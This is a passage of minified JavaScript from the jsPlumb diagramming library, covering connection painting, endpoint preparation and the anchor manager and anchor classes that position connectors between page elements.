                    elementId: this.endpoints[0].elementId,
                    txy: [o.left, o.top],
                    twh: p,
                    tElement: this.endpoints[1],
                    timestamp: q
                });
            this.endpoints[0].paint({
                anchorLoc: r,
                timestamp: q
            }), r = this.endpoints[1].anchor.compute({
                xy: [o.left, o.top],
                wh: p,
                element: this.endpoints[1],
                elementId: this.endpoints[1].elementId,
                txy: [l.left, l.top],
                twh: m,
                tElement: this.endpoints[0],
                timestamp: q
            }), this.endpoints[1].paint({anchorLoc: r, timestamp: q})
        }
        this.getTypeDescriptor = function () {
            return "connection"
        }, this.getAttachedElements = function () {
            return this.endpoints
        }, this.isDetachable = function () {
            return !0 === this._jsPlumb.detachable
        }, this.setDetachable = function (a) {
            this._jsPlumb.detachable = !0 === a
        }, this.isReattach = function () {
            return !0 === this._jsPlumb.reattach || !0 === this.endpoints[0].reattachConnections || !0 === this.endpoints[1].reattachConnections
        }, this.setReattach = function (a) {
            this._jsPlumb.reattach = !0 === a
        }, this._jsPlumb.cost = a.cost || this.endpoints[0].getConnectionCost(), this._jsPlumb.directed = a.directed, null == a.directed && (this._jsPlumb.directed = this.endpoints[0].areConnectionsDirected());
        var s = b.extend({}, this.endpoints[1].getParameters());
        b.extend(s, this.endpoints[0].getParameters()), b.extend(s, this.getParameters()), this.setParameters(s), this.setConnector(this.endpoints[0].connector || this.endpoints[1].connector || a.connector || e.Defaults.Connector || b.Defaults.Connector, !0);
        var t = null != a.data && c.isObject(a.data) ? a.data : {};
        this.getData = function () {
            return t
        }, this.setData = function (a) {
            t = a || {}
        }, this.mergeData = function (a) {
            t = b.extend(t, a)
        };
        var u = ["default", this.endpoints[0].connectionType, this.endpoints[1].connectionType, a.type].join(" ");
        /[^\s]/.test(u) && this.addType(u, a.data, !0), this.updateConnectedClass()
    }, c.extend(b.Connection, b.OverlayCapableJsPlumbUIComponent, {
        applyType: function (a, c, d) {
            var e = null;
            null != a.connector && (e = this.getCachedTypeItem("connector", d.connector), null == e && (e = this.prepareConnector(a.connector, d.connector), this.cacheTypeItem("connector", e, d.connector)), this.setPreparedConnector(e)), null != a.detachable && this.setDetachable(a.detachable), null != a.reattach && this.setReattach(a.reattach), a.scope && (this.scope = a.scope), null != a.cssClass && this.canvas && this._jsPlumb.instance.addClass(this.canvas, a.cssClass);
            var f = null;
            a.anchor ? null == (f = this.getCachedTypeItem("anchors", d.anchor)) && (f = [this._jsPlumb.instance.makeAnchor(a.anchor), this._jsPlumb.instance.makeAnchor(a.anchor)], this.cacheTypeItem("anchors", f, d.anchor)) : a.anchors && null == (f = this.getCachedTypeItem("anchors", d.anchors)) && (f = [this._jsPlumb.instance.makeAnchor(a.anchors[0]), this._jsPlumb.instance.makeAnchor(a.anchors[1])], this.cacheTypeItem("anchors", f, d.anchors)), null != f && (this.endpoints[0].anchor = f[0], this.endpoints[1].anchor = f[1], this.endpoints[1].anchor.isDynamic && this._jsPlumb.instance.repaint(this.endpoints[1].elementId)), b.OverlayCapableJsPlumbUIComponent.applyType(this, a)
        }, addClass: function (a, b) {
            b && (this.endpoints[0].addClass(a), this.endpoints[1].addClass(a), this.suspendedEndpoint && this.suspendedEndpoint.addClass(a)), this.connector && this.connector.addClass(a)
        }, removeClass: function (a, b) {
            b && (this.endpoints[0].removeClass(a), this.endpoints[1].removeClass(a), this.suspendedEndpoint && this.suspendedEndpoint.removeClass(a)), this.connector && this.connector.removeClass(a)
        }, isVisible: function () {
            return this._jsPlumb.visible
        }, setVisible: function (a) {
            this._jsPlumb.visible = a, this.connector && this.connector.setVisible(a), this.repaint()
        }, cleanup: function () {
            this.updateConnectedClass(!0), this.endpoints = null, this.source = null, this.target = null, null != this.connector && (this.connector.cleanup(!0), this.connector.destroy(!0)), this.connector = null
        }, updateConnectedClass: function (a) {
            this._jsPlumb && (f(this, this.source, this._jsPlumb.instance, a), f(this, this.target, this._jsPlumb.instance, a))
        }, setHover: function (b) {
            this.connector && this._jsPlumb && !this._jsPlumb.instance.isConnectionBeingDragged() && (this.connector.setHover(b), a.jsPlumb[b ? "addClass" : "removeClass"](this.source, this._jsPlumb.instance.hoverSourceClass), a.jsPlumb[b ? "addClass" : "removeClass"](this.target, this._jsPlumb.instance.hoverTargetClass))
        }, getUuids: function () {
            return [this.endpoints[0].getUuid(), this.endpoints[1].getUuid()]
        }, getCost: function () {
            return this._jsPlumb ? this._jsPlumb.cost : -1 / 0
        }, setCost: function (a) {
            this._jsPlumb.cost = a
        }, isDirected: function () {
            return this._jsPlumb.directed
        }, getConnector: function () {
            return this.connector
        }, prepareConnector: function (a, b) {
            var e, f = {
                _jsPlumb: this._jsPlumb.instance,
                cssClass: this._jsPlumb.params.cssClass,
                container: this._jsPlumb.params.container,
                "pointer-events": this._jsPlumb.params["pointer-events"]
            }, g = this._jsPlumb.instance.getRenderMode();
            return c.isString(a) ? e = d(this._jsPlumb.instance, g, a, f, this) : c.isArray(a) && (e = 1 === a.length ? d(this._jsPlumb.instance, g, a[0], f, this) : d(this._jsPlumb.instance, g, a[0], c.merge(a[1], f), this)), null != b && (e.typeId = b), e
        }, setPreparedConnector: function (a, b, c, d) {
            if (this.connector !== a) {
                var e, f = "";
                if (null != this.connector && (e = this.connector, f = e.getClass(), this.connector.cleanup(), this.connector.destroy()), this.connector = a, d && this.cacheTypeItem("connector", a, d), this.canvas = this.connector.canvas, this.bgCanvas = this.connector.bgCanvas, this.addClass(f), this.canvas && (this.canvas._jsPlumb = this), this.bgCanvas && (this.bgCanvas._jsPlumb = this), null != e) for (var g = this.getOverlays(), h = 0; h < g.length; h++) g[h].transfer && g[h].transfer(this.connector);
                c || this.setListenerComponent(this.connector), b || this.repaint()
            }
        }, setConnector: function (a, b, c, d) {
            var e = this.prepareConnector(a, d);
            this.setPreparedConnector(e, b, c, d)
        }, paint: function (a) {
            if (!this._jsPlumb.instance.isSuspendDrawing() && this._jsPlumb.visible) {
                a = a || {};
                var b = a.timestamp, c = !1, d = c ? this.sourceId : this.targetId,
                    e = c ? this.targetId : this.sourceId, f = c ? 0 : 1, g = c ? 1 : 0;
                if (null == b || b !== this._jsPlumb.lastPaintedAt) {
                    var h = this._jsPlumb.instance.updateOffset({elId: e}).o,
                        i = this._jsPlumb.instance.updateOffset({elId: d}).o, j = this.endpoints[g],
                        k = this.endpoints[f], l = j.anchor.getCurrentLocation({
                            xy: [h.left, h.top],
                            wh: [h.width, h.height],
                            element: j,
                            timestamp: b
                        }), m = k.anchor.getCurrentLocation({
                            xy: [i.left, i.top],
                            wh: [i.width, i.height],
                            element: k,
                            timestamp: b
                        });
                    this.connector.resetBounds(), this.connector.compute({
                        sourcePos: l,
                        targetPos: m,
                        sourceOrientation: j.anchor.getOrientation(j),
                        targetOrientation: k.anchor.getOrientation(k),
                        sourceEndpoint: this.endpoints[g],
                        targetEndpoint: this.endpoints[f],
                        "stroke-width": this._jsPlumb.paintStyleInUse.strokeWidth,
                        sourceInfo: h,
                        targetInfo: i
                    });
                    var n = {minX: 1 / 0, minY: 1 / 0, maxX: -1 / 0, maxY: -1 / 0};
                    for (var o in this._jsPlumb.overlays) if (this._jsPlumb.overlays.hasOwnProperty(o)) {
                        var p = this._jsPlumb.overlays[o];
                        p.isVisible() && (this._jsPlumb.overlayPlacements[o] = p.draw(this.connector, this._jsPlumb.paintStyleInUse, this.getAbsoluteOverlayPosition(p)), n.minX = Math.min(n.minX, this._jsPlumb.overlayPlacements[o].minX), n.maxX = Math.max(n.maxX, this._jsPlumb.overlayPlacements[o].maxX), n.minY = Math.min(n.minY, this._jsPlumb.overlayPlacements[o].minY), n.maxY = Math.max(n.maxY, this._jsPlumb.overlayPlacements[o].maxY))
                    }
                    var q = parseFloat(this._jsPlumb.paintStyleInUse.strokeWidth || 1) / 2,
                        r = parseFloat(this._jsPlumb.paintStyleInUse.strokeWidth || 0), s = {
                            xmin: Math.min(this.connector.bounds.minX - (q + r), n.minX),
                            ymin: Math.min(this.connector.bounds.minY - (q + r), n.minY),
                            xmax: Math.max(this.connector.bounds.maxX + (q + r), n.maxX),
                            ymax: Math.max(this.connector.bounds.maxY + (q + r), n.maxY)
                        };
                    this.connector.paint(this._jsPlumb.paintStyleInUse, null, s);
                    for (var t in this._jsPlumb.overlays) if (this._jsPlumb.overlays.hasOwnProperty(t)) {
                        var u = this._jsPlumb.overlays[t];
                        u.isVisible() && u.paint(this._jsPlumb.overlayPlacements[t], s)
                    }
                }
                this._jsPlumb.lastPaintedAt = b
            }
        }, repaint: function (a) {
            var b = jsPlumb.extend(a || {}, {});
            b.elId = this.sourceId, this.paint(b)
        }, prepareEndpoint: function (a, c, d, f, g, h, i, j) {
            var k;
            if (f) d.endpoints[g] = f, f.addConnection(d); else {
                h.endpoints || (h.endpoints = [null, null]);
                var l = h.endpoints[g] || h.endpoint || a.Defaults.Endpoints[g] || b.Defaults.Endpoints[g] || a.Defaults.Endpoint || b.Defaults.Endpoint;
                h.endpointStyles || (h.endpointStyles = [null, null]), h.endpointHoverStyles || (h.endpointHoverStyles = [null, null]);
                var m = h.endpointStyles[g] || h.endpointStyle || a.Defaults.EndpointStyles[g] || b.Defaults.EndpointStyles[g] || a.Defaults.EndpointStyle || b.Defaults.EndpointStyle;
                null == m.fill && null != h.paintStyle && (m.fill = h.paintStyle.stroke), null == m.outlineStroke && null != h.paintStyle && (m.outlineStroke = h.paintStyle.outlineStroke), null == m.outlineWidth && null != h.paintStyle && (m.outlineWidth = h.paintStyle.outlineWidth);
                var n = h.endpointHoverStyles[g] || h.endpointHoverStyle || a.Defaults.EndpointHoverStyles[g] || b.Defaults.EndpointHoverStyles[g] || a.Defaults.EndpointHoverStyle || b.Defaults.EndpointHoverStyle;
                null != h.hoverPaintStyle && (null == n && (n = {}), null == n.fill && (n.fill = h.hoverPaintStyle.stroke));
                var o = h.anchors ? h.anchors[g] : h.anchor ? h.anchor : e(a.Defaults.Anchors[g], j, a) || e(b.Defaults.Anchors[g], j, a) || e(a.Defaults.Anchor, j, a) || e(b.Defaults.Anchor, j, a);
                k = c({
                    paintStyle: m,
                    hoverPaintStyle: n,
                    endpoint: l,
                    connections: [d],
                    uuid: h.uuids ? h.uuids[g] : null,
                    anchor: o,
                    source: i,
                    scope: h.scope,
                    reattach: h.reattach || a.Defaults.ReattachConnections,
                    detachable: h.detachable || a.Defaults.ConnectionsDetachable
                }), null == f && k.setDeleteOnEmpty(!0), d.endpoints[g] = k, !1 === h.drawEndpoints && k.setVisible(!1, !0, !0)
            }
            return k
        }
    })
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumbUtil, c = a.jsPlumb;
    c.AnchorManager = function (a) {
        var d = {}, e = {}, f = {}, g = {}, h = {}, i = this, j = {}, k = a.jsPlumbInstance, l = {},
            m = function (a, b, c, d, e, f, g) {
                for (var h = [], i = b[e ? 0 : 1] / (d.length + 1), j = 0; j < d.length; j++) {
                    var k = (j + 1) * i, l = f * b[e ? 1 : 0];
                    g && (k = b[e ? 0 : 1] - k);
                    var m = e ? k : l, n = c[0] + m, o = m / b[0], p = e ? l : k, q = c[1] + p, r = p / b[1];
                    h.push([n, q, o, r, d[j][1], d[j][2]])
                }
                return h
            }, n = function (a) {
                return function (b, c) {
                    var d = !0;
                    return d = a ? b[0][0] < c[0][0] : b[0][0] > c[0][0], !1 === d ? -1 : 1
                }
            }, o = function (a, b) {
                return (a[0][0] < 0 ? -Math.PI - a[0][0] : Math.PI - a[0][0]) > (b[0][0] < 0 ? -Math.PI - b[0][0] : Math.PI - b[0][0]) ? 1 : -1
            }, p = {
                top: function (a, b) {
                    return a[0] > b[0] ? 1 : -1
                }, right: n(!0), bottom: n(!0), left: o
            }, q = function (a, b) {
                return a.sort(b)
            }, r = function (a, b) {
                var c = k.getCachedData(a), d = c.s, f = c.o, h = function (b, c, d, f, h, i, j) {
                    if (f.length > 0) for (var k = q(f, p[b]), l = "right" === b || "top" === b, n = m(b, c, d, k, h, i, l), o = function (a, b) {
                        e[a.id] = [b[0], b[1], b[2], b[3]], g[a.id] = j
                    }, r = 0; r < n.length; r++) {
                        var s = n[r][4], t = s.endpoints[0].elementId === a, u = s.endpoints[1].elementId === a;
                        t && o(s.endpoints[0], n[r]), u && o(s.endpoints[1], n[r])
                    }
                };
                h("bottom", d, [f.left, f.top], b.bottom, !0, 1, [0, 1]), h("top", d, [f.left, f.top], b.top, !0, 0, [0, -1]), h("left", d, [f.left, f.top], b.left, !1, 0, [-1, 0]), h("right", d, [f.left, f.top], b.right, !1, 1, [1, 0])
            };
        this.reset = function () {
            d = {}, h = {}, j = {}
        }, this.addFloatingConnection = function (a, b) {
            l[a] = b
        }, this.removeFloatingConnection = function (a) {
            delete l[a]
        }, this.newConnection = function (a) {
            var d = a.sourceId, e = a.targetId, f = a.endpoints, g = !0, i = function (i, j, k, l, m) {
                d === e && k.isContinuous && (a._jsPlumb.instance.removeElement(f[1].canvas), g = !1), b.addToList(h, l, [m, j, k.constructor === c.DynamicAnchor])
            };
            i(0, f[0], f[0].anchor, e, a), g && i(1, f[1], f[1].anchor, d, a)
        };
        var s = function (a) {
            !function (a, c) {
                if (a) {
                    var d = function (a) {
                        return a[4] === c
                    };
                    b.removeWithFunction(a.top, d), b.removeWithFunction(a.left, d), b.removeWithFunction(a.bottom, d), b.removeWithFunction(a.right, d)
                }
            }(j[a.elementId], a.id)
        };
        this.connectionDetached = function (a, c) {
            var d = a.connection || a, e = a.sourceId, f = a.targetId, g = d.endpoints, j = function (a, c, d, e, f) {
                b.removeWithFunction(h[e], function (a) {
                    return a[0].id === f.id
                })
            };
            j(1, g[1], g[1].anchor, e, d), j(0, g[0], g[0].anchor, f, d), d.floatingId && (j(d.floatingIndex, d.floatingEndpoint, d.floatingEndpoint.anchor, d.floatingId, d), s(d.floatingEndpoint)), s(d.endpoints[0]), s(d.endpoints[1]), c || (i.redraw(d.sourceId), d.targetId !== d.sourceId && i.redraw(d.targetId))
        }, this.add = function (a, c) {
            b.addToList(d, c, a)
        }, this.changeId = function (a, b) {
            h[b] = h[a], d[b] = d[a], delete h[a], delete d[a]
        }, this.getConnectionsFor = function (a) {
            return h[a] || []
        }, this.getEndpointsFor = function (a) {
            return d[a] || []
        }, this.deleteEndpoint = function (a) {
            b.removeWithFunction(d[a.elementId], function (b) {
                return b.id === a.id
            }), s(a)
        }, this.clearFor = function (a) {
            delete d[a], d[a] = []
        };
        var t = function (c, d, e, f, g, h, i, j, k, l, m, n) {
            var o, p, q = -1, r = -1, s = f.endpoints[i], t = s.id, u = [1, 0][i], v = [[d, e], f, g, h, t], w = c[k],
                x = s._continuousAnchorEdge ? c[s._continuousAnchorEdge] : null;
            if (x) {
                var y = b.findWithFunction(x, function (a) {
                    return a[4] === t
                });
                if (-1 !== y) for (x.splice(y, 1), o = 0; o < x.length; o++) p = x[o][1], b.addWithFunction(m, p, function (a) {
                    return a.id === p.id
                }), b.addWithFunction(n, x[o][1].endpoints[i], function (a) {
                    return a.id === p.endpoints[i].id
                }), b.addWithFunction(n, x[o][1].endpoints[u], function (a) {
                    return a.id === p.endpoints[u].id
                })
            }
            for (o = 0; o < w.length; o++) p = w[o][1], 1 === a.idx && w[o][3] === h && -1 === r && (r = o), b.addWithFunction(m, p, function (a) {
                return a.id === p.id
            }), b.addWithFunction(n, w[o][1].endpoints[i], function (a) {
                return a.id === p.endpoints[i].id
            }), b.addWithFunction(n, w[o][1].endpoints[u], function (a) {
                return a.id === p.endpoints[u].id
            });
            if (-1 !== q) w[q] = v; else {
                var z = j ? -1 !== r ? r : 0 : w.length;
                w.splice(z, 0, v)
            }
            s._continuousAnchorEdge = k
        };
        this.updateOtherEndpoint = function (a, d, e, f) {
            var g = b.findWithFunction(h[a], function (a) {
                return a[0].id === f.id
            }), i = b.findWithFunction(h[d], function (a) {
                return a[0].id === f.id
            });
            -1 !== g && (h[a][g][0] = f, h[a][g][1] = f.endpoints[1], h[a][g][2] = f.endpoints[1].anchor.constructor === c.DynamicAnchor), i > -1 && (h[d].splice(i, 1), b.addToList(h, e, [f, f.endpoints[0], f.endpoints[0].anchor.constructor === c.DynamicAnchor])), f.updateConnectedClass()
        }, this.sourceChanged = function (a, d, e, f) {
            if (a !== d) {
                e.sourceId = d, e.source = f, b.removeWithFunction(h[a], function (a) {
                    return a[0].id === e.id
                });
                var g = b.findWithFunction(h[e.targetId], function (a) {
                    return a[0].id === e.id
                });
                g > -1 && (h[e.targetId][g][0] = e, h[e.targetId][g][1] = e.endpoints[0], h[e.targetId][g][2] = e.endpoints[0].anchor.constructor === c.DynamicAnchor), b.addToList(h, d, [e, e.endpoints[1], e.endpoints[1].anchor.constructor === c.DynamicAnchor]), e.endpoints[1].anchor.isContinuous && (e.source === e.target ? e._jsPlumb.instance.removeElement(e.endpoints[1].canvas) : null == e.endpoints[1].canvas.parentNode && e._jsPlumb.instance.appendElement(e.endpoints[1].canvas)), e.updateConnectedClass()
            }
        }, this.rehomeEndpoint = function (a, b, c) {
            var e = d[b] || [], f = k.getId(c);
            if (f !== b) {
                var g = e.indexOf(a);
                if (g > -1) {
                    var h = e.splice(g, 1)[0];
                    i.add(h, f)
                }
            }
            for (var j = 0; j < a.connections.length; j++) a.connections[j].sourceId === b ? i.sourceChanged(b, a.elementId, a.connections[j], a.element) : a.connections[j].targetId === b && (a.connections[j].targetId = a.elementId, a.connections[j].target = a.element, i.updateOtherEndpoint(a.connections[j].sourceId, b, a.elementId, a.connections[j]))
        }, this.redraw = function (a, e, f, g, i, m) {
            if (!k.isSuspendDrawing()) {
                var n = d[a] || [], o = h[a] || [], p = [], q = [], s = [];
                f = f || k.timestamp(), g = g || {left: 0, top: 0}, e && (e = {
                    left: e.left + g.left,
                    top: e.top + g.top
                });
                for (var u = k.updateOffset({
                    elId: a,
                    offset: e,
                    recalc: !1,
                    timestamp: f
                }), v = {}, w = 0; w < o.length; w++) {
                    var x = o[w][0], y = x.sourceId, z = x.targetId, A = x.endpoints[0].anchor.isContinuous,
                        B = x.endpoints[1].anchor.isContinuous;
                    if (A || B) {
                        var C = y + "_" + z, D = v[C], E = x.sourceId === a ? 1 : 0;
                        A && !j[y] && (j[y] = {
                            top: [],
                            right: [],
                            bottom: [],
                            left: []
                        }), B && !j[z] && (j[z] = {
                            top: [],
                            right: [],
                            bottom: [],
                            left: []
                        }), a !== z && k.updateOffset({elId: z, timestamp: f}), a !== y && k.updateOffset({
                            elId: y,
                            timestamp: f
                        });
                        var F = k.getCachedData(z), G = k.getCachedData(y);
                        z === y && (A || B) ? (t(j[y], -Math.PI / 2, 0, x, !1, z, 0, !1, "top", y, p, q), t(j[z], -Math.PI / 2, 0, x, !1, y, 1, !1, "top", z, p, q)) : (D || (D = this.calculateOrientation(y, z, G.o, F.o, x.endpoints[0].anchor, x.endpoints[1].anchor, x), v[C] = D), A && t(j[y], D.theta, 0, x, !1, z, 0, !1, D.a[0], y, p, q), B && t(j[z], D.theta2, -1, x, !0, y, 1, !0, D.a[1], z, p, q)), A && b.addWithFunction(s, y, function (a) {
                            return a === y
                        }), B && b.addWithFunction(s, z, function (a) {
                            return a === z
                        }), b.addWithFunction(p, x, function (a) {
                            return a.id === x.id
                        }), (A && 0 === E || B && 1 === E) && b.addWithFunction(q, x.endpoints[E], function (a) {
                            return a.id === x.endpoints[E].id
                        })
                    }
                }
                for (w = 0; w < n.length; w++) 0 === n[w].connections.length && n[w].anchor.isContinuous && (j[a] || (j[a] = {
                    top: [],
                    right: [],
                    bottom: [],
                    left: []
                }), t(j[a], -Math.PI / 2, 0, {
                    endpoints: [n[w], n[w]], paint: function () {
                    }
                }, !1, a, 0, !1, n[w].anchor.getDefaultFace(), a, p, q), b.addWithFunction(s, a, function (b) {
                    return b === a
                }));
                for (w = 0; w < s.length; w++) r(s[w], j[s[w]]);
                for (w = 0; w < n.length; w++) n[w].paint({timestamp: f, offset: u, dimensions: u.s, recalc: !0 !== m});
                for (w = 0; w < q.length; w++) {
                    var H = k.getCachedData(q[w].elementId);
                    q[w].paint({timestamp: f, offset: H, dimensions: H.s})
                }
                for (w = 0; w < o.length; w++) {
                    var I = o[w][1];
                    if (I.anchor.constructor === c.DynamicAnchor) {
                        I.paint({elementWithPrecedence: a, timestamp: f}), b.addWithFunction(p, o[w][0], function (a) {
                            return a.id === o[w][0].id
                        });
                        for (var J = 0; J < I.connections.length; J++) I.connections[J] !== o[w][0] && b.addWithFunction(p, I.connections[J], function (a) {
                            return a.id === I.connections[J].id
                        })
                    } else b.addWithFunction(p, o[w][0], function (a) {
                        return a.id === o[w][0].id
                    })
                }
                var K = l[a];
                for (K && K.paint({timestamp: f, recalc: !1, elId: a}), w = 0; w < p.length; w++) p[w].paint({
                    elId: a,
                    timestamp: f,
                    recalc: !1,
                    clearEdits: i
                })
            }
        };
        var u = function (a) {
            b.EventGenerator.apply(this), this.type = "Continuous", this.isDynamic = !0, this.isContinuous = !0;
            for (var c = a.faces || ["top", "right", "bottom", "left"], d = !(!1 === a.clockwise), h = {}, i = {
                top: "bottom",
                right: "left",
                left: "right",
                bottom: "top"
            }, j = {top: "right", right: "bottom", left: "top", bottom: "left"}, k = {
                top: "left",
                right: "top",
                left: "bottom",
                bottom: "right"
            }, l = d ? j : k, m = d ? k : j, n = a.cssClass || "", o = null, p = null, q = ["left", "right"], r = ["top", "bottom"], s = null, t = 0; t < c.length; t++) h[c[t]] = !0;
            this.getDefaultFace = function () {
                return 0 === c.length ? "top" : c[0]
            }, this.isRelocatable = function () {
                return !0
            }, this.isSnapOnRelocate = function () {
                return !0
            }, this.verifyEdge = function (a) {
                return h[a] ? a : h[i[a]] ? i[a] : h[l[a]] ? l[a] : h[m[a]] ? m[a] : a
            }, this.isEdgeSupported = function (a) {
                return null == s ? null == p ? !0 === h[a] : p === a : -1 !== s.indexOf(a)
            }, this.setCurrentFace = function (a, b) {
                o = a, b && null != p && (p = o)
            }, this.getCurrentFace = function () {
                return o
            }, this.getSupportedFaces = function () {
                var a = [];
                for (var b in h) h[b] && a.push(b);
                return a
            }, this.lock = function () {
                p = o
            }, this.unlock = function () {
                p = null
            }, this.isLocked = function () {
                return null != p
            }, this.lockCurrentAxis = function () {
                null != o && (s = "left" === o || "right" === o ? q : r)
            }, this.unlockCurrentAxis = function () {
                s = null
            }, this.compute = function (a) {
                return f[a.element.id] || e[a.element.id] || [0, 0]
            }, this.getCurrentLocation = function (a) {
                return f[a.element.id] || e[a.element.id] || [0, 0]
            }, this.getOrientation = function (a) {
                return g[a.id] || [0, 0]
            }, this.clearUserDefinedLocation = function () {
                delete f[a.elementId]
            }, this.setUserDefinedLocation = function (b) {
                f[a.elementId] = b
            }, this.getCssClass = function () {
                return n
            }
        };
        k.continuousAnchorFactory = {
            get: function (a) {
                return new u(a)
            }, clear: function (a) {
                delete f[a], delete e[a]
            }
        }
    }, c.AnchorManager.prototype.calculateOrientation = function (a, b, c, d, e, f) {
        var g = {HORIZONTAL: "horizontal", VERTICAL: "vertical", DIAGONAL: "diagonal", IDENTITY: "identity"},
            h = ["left", "top", "right", "bottom"];
        if (a === b) return {orientation: g.IDENTITY, a: ["top", "top"]};
        var i = Math.atan2(d.centery - c.centery, d.centerx - c.centerx),
            j = Math.atan2(c.centery - d.centery, c.centerx - d.centerx), k = [], l = {};
        !function (a, b) {
            for (var c = 0; c < a.length; c++) l[a[c]] = {
                left: [b[c].left, b[c].centery],
                right: [b[c].right, b[c].centery],
                top: [b[c].centerx, b[c].top],
                bottom: [b[c].centerx, b[c].bottom]
            }
        }(["source", "target"], [c, d]);
        for (var m = 0; m < h.length; m++) for (var n = 0; n < h.length; n++) k.push({
            source: h[m],
            target: h[n],
            dist: Biltong.lineLength(l.source[h[m]], l.target[h[n]])
        });
        k.sort(function (a, b) {
            return a.dist < b.dist ? -1 : a.dist > b.dist ? 1 : 0
        });
        for (var o = k[0].source, p = k[0].target, q = 0; q < k.length && (o = !e.isContinuous || e.isEdgeSupported(k[q].source) ? k[q].source : null, p = !f.isContinuous || f.isEdgeSupported(k[q].target) ? k[q].target : null, null == o || null == p); q++) ;
        return e.isContinuous && e.setCurrentFace(o), f.isContinuous && f.setCurrentFace(p), {
            a: [o, p],
            theta: i,
            theta2: j
        }
    }, c.Anchor = function (a) {
        this.x = a.x || 0, this.y = a.y || 0, this.elementId = a.elementId, this.cssClass = a.cssClass || "", this.userDefinedLocation = null, this.orientation = a.orientation || [0, 0], this.lastReturnValue = null, this.offsets = a.offsets || [0, 0], this.timestamp = null;
        var c = !1 !== a.relocatable;
        this.isRelocatable = function () {
            return c
        }, this.setRelocatable = function (a) {
            c = a
        };
        var d = !1 !== a.snapOnRelocate;
        this.isSnapOnRelocate = function () {
            return d
        };
        var e = !1;
        this.lock = function () {
            e = !0
        }, this.unlock = function () {
            e = !1
        }, this.isLocked = function () {
            return e
        }, b.EventGenerator.apply(this), this.compute = function (a) {
            var b = a.xy, c = a.wh, d = a.timestamp;
            return a.clearUserDefinedLocation && (this.userDefinedLocation = null), d && d === this.timestamp ? this.lastReturnValue : (null != this.userDefinedLocation ? this.lastReturnValue = this.userDefinedLocation : this.lastReturnValue = [b[0] + this.x * c[0] + this.offsets[0], b[1] + this.y * c[1] + this.offsets[1], this.x, this.y], this.timestamp = d, this.lastReturnValue)
        }, this.getCurrentLocation = function (a) {
            return a = a || {}, null == this.lastReturnValue || null != a.timestamp && this.timestamp !== a.timestamp ? this.compute(a) : this.lastReturnValue
        }, this.setPosition = function (a, b, c, d, f) {
            e && !f || (this.x = a, this.y = b, this.orientation = [c, d], this.lastReturnValue = null)
        }
    }, b.extend(c.Anchor, b.EventGenerator, {
        equals: function (a) {
            if (!a) return !1;
            var b = a.getOrientation(), c = this.getOrientation();
            return this.x === a.x && this.y === a.y && this.offsets[0] === a.offsets[0] && this.offsets[1] === a.offsets[1] && c[0] === b[0] && c[1] === b[1]
        }, getUserDefinedLocation: function () {
            return this.userDefinedLocation
        }, setUserDefinedLocation: function (a) {
            this.userDefinedLocation = a
        }, clearUserDefinedLocation: function () {
            this.userDefinedLocation = null
        }, getOrientation: function () {
            return this.orientation
        }, getCssClass: function () {
            return this.cssClass
        }
    }), c.FloatingAnchor = function (a) {
        c.Anchor.apply(this, arguments);
        var b = a.reference, d = a.referenceCanvas, e = c.getSize(d), f = null, g = null;
        this.orientation = null, this.x = 0, this.y = 0, this.isFloating = !0, this.compute = function (a) {
            var b = a.xy, c = [b[0] + e[0] / 2, b[1] + e[1] / 2];
            return g = c, c
        }, this.getOrientation = function (a) {
            if (f) return f;
            var c = b.getOrientation(a);
            return [0 * Math.abs(c[0]) * -1, 0 * Math.abs(c[1]) * -1]
        }, this.over = function (a, b) {
            f = a.getOrientation(b)
        }, this.out = function () {
            f = null
        }, this.getCurrentLocation = function (a) {
            return null == g ? this.compute(a) : g
        }
    }, b.extend(c.FloatingAnchor, c.Anchor);
    var d = function (a, b, d) {
        return a.constructor === c.Anchor ? a : b.makeAnchor(a, d, b)
    };
    c.DynamicAnchor = function (a) {
        c.Anchor.apply(this, arguments), this.isDynamic = !0, this.anchors = [], this.elementId = a.elementId, this.jsPlumbInstance = a.jsPlumbInstance;
        for (var b = 0; b < a.anchors.length; b++) this.anchors[b] = d(a.anchors[b], this.jsPlumbInstance, this.elementId);
        this.getAnchors = function () {
            return this.anchors
        };
        var e = this.anchors.length > 0 ? this.anchors[0] : null, f = e, g = this, h = function (a, b, c, d, e) {
            var f = d[0] + a.x * e[0], g = d[1] + a.y * e[1], h = d[0] + e[0] / 2, i = d[1] + e[1] / 2;
            return Math.sqrt(Math.pow(b - f, 2) + Math.pow(c - g, 2)) + Math.sqrt(Math.pow(h - f, 2) + Math.pow(i - g, 2))
        }, i = a.selector || function (a, b, c, d, e) {
            for (var f = c[0] + d[0] / 2, g = c[1] + d[1] / 2, i = -1, j = 1 / 0, k = 0; k < e.length; k++) {
                var l = h(e[k], f, g, a, b);
                l < j && (i = k + 0, j = l)
            }
            return e[i]
        };
        this.compute = function (a) {
            var b = a.xy, c = a.wh, d = a.txy, h = a.twh;
            this.timestamp = a.timestamp;
            var j = g.getUserDefinedLocation();
            return null != j ? j : this.isLocked() || null == d || null == h ? e.compute(a) : (a.timestamp = null, e = i(b, c, d, h, this.anchors), this.x = e.x, this.y = e.y, e !== f && this.fire("anchorChanged", e), f = e, e.compute(a))
        }, this.getCurrentLocation = function (a) {
            return this.getUserDefinedLocation() || (null != e ? e.getCurrentLocation(a) : null)
        }, this.getOrientation = function (a) {
            return null != e ? e.getOrientation(a) : [0, 0]
        }, this.over = function (a, b) {
            null != e && e.over(a, b)
        }, this.out = function () {
            null != e && e.out()
        }, this.setAnchor = function (a) {
            e = a
        }, this.getCssClass = function () {
            return e && e.getCssClass() || ""
        }, this.setAnchorCoordinates = function (a) {
            var b = jsPlumbUtil.findWithFunction(this.anchors, function (b) {
                return b.x === a[0] && b.y === a[1]
            });
            return -1 !== b && (this.setAnchor(this.anchors[b]), !0)
        }
    }, b.extend(c.DynamicAnchor, c.Anchor);
    var e = function (a, b, d, e, f, g) {
        c.Anchors[f] = function (c) {
            var h = c.jsPlumbInstance.makeAnchor([a, b, d, e, 0, 0], c.elementId, c.jsPlumbInstance);
            return h.type = f, g && g(h, c), h
        }
    };
